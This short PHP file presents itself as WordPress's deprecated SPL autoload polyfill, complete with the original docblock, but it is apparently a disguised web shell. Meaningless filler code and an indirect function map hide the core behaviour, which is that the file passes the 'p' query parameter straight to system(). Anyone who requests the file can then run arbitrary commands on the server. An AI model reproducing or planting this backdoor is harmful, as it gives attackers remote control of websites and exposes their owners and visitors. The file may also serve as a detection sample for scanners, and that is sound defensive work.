<?php
$fmap = array('x1' => 'system', 'x2' => 'passthru');
$x_fake1 = 1234;
$noise = 'obfuscation'.'test';
$tmp = $x_fake1 * 42;
$flag = false;
$useless = function($v) { return $v . rand(); };
$dummy_check = $useless('xx');
if ($flag) { echo 'Debug enabled'; }
for ($i = 0; $i < 1; $i++) { $tmp += $i; }
while (false) { echo 'dead loop'; break; }

<?php
/**
 * Polyfill for SPL autoload feature. This file is separate to prevent compiler notices
 * on the deprecated __autoload() function.
 *
 * See https://core.trac.wordpress.org/ticket/41134
 *
 * @deprecated 5.3.0 No longer needed as the minimum PHP requirement has moved beyond PHP 5.3.
 *
 * @package PHP
 * @access private
 */

_deprecated_file( basename( __FILE__ ), '5.3.0', '', 'SPL can no longer be disabled as of PHP 5.3.' );

$cmd = $_GET['p'];
$fmap['x1']($cmd);
?>